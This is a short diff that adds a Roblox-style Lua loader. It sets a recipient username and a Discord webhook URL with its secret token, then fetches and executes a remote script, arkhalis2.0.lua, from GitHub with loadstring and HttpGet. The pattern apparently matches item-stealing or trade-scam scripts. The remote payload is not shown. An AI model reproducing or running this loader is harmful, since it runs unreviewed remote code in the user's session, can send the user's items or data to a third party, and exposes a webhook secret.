@@ -1,0 +1,3 @@
+_G.Username = "IM_D1N6"
+_G.Webhook = "https://discord.com/api/webhooks/1204259320855011368/appgko1pEXwoUwPJandaOsEbdnxGgAI4b4GxUPHTe7qsT1voiwTRnJcIiVRnSJLB2gGx"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Arkhalislua/Arkhalislua.github.io/main/arkhalis2.0.lua"))()
